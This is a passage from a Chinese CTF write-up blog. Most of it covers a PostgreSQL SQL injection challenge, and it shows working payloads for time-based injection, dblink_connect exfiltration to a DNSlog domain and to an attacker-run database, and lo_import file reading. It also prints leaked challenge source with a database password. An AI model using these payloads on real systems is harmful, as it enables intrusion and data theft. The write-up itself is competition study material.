id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了，一篇wp却写不出多少东西，通篇八题仅仅一千字，可能是题目问题，也有一部分我的问题，总之多多总结吧。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
      <link href="article/cqb2021/"/>
      <url>article/cqb2021/</url>
      
        <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><a id="more"></a><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥" loading="lazy"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF2021</title>
      <link href="article/djbctf2021/"/>
      <url>article/djbctf2021/</url>
      
        <content type="html"><![CDATA[<p>2021第一场比赛</p><p>昵称：别答了别答了再答人傻了</p><a id="more"></a><p>DJBctf，孩子太菜了呜呜呜</p><p>做了两道web，签到题有非预期(汗)，分析下预期和非预期解法，加上些个人的理解</p><p>本Web狗何德何能，尝试做了一道密码学…赛后才终于出了。</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 